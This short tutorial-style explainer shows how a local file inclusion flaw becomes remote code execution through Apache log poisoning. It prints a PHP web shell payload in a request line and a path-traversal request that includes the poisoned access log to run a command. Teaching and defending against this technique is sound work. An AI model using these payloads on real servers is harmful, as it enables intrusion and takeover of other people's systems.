LFI to RCE: Injecting into Log Files

Turning Log Entries into Executable Code

1Inject Malicious PHP

Attacker crafts a URL request containing PHP code (e.g., <?php system($_GET['cmd']); ?>).

2Server Logs Payload

The web server logs the malicious request, including the PHP payload, into its access log file.

3LFI Includes Log File

Attacker uses LFI to include the path to the poisoned log file (e.g., /var/log/apache2/access.log).

4Payload Executes (RCE)

The vulnerable application processes the log file, executing the injected PHP code, granting RCE.

Step 1: Injecting PHP into Access Log
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Step 3: Including the Log File via LFI
GET /index.php?page=../../../../var/log/apache2/access.log&cmd=id HTTP/1.1
Host: example.com
Result: The id command is executed on the server, returning user and group information.
Key Takeaway

By injecting malicious PHP into server logs via a URL request and then including those logs via LFI, attackers can achieve remote code execution, turning log files into executable backdoors.
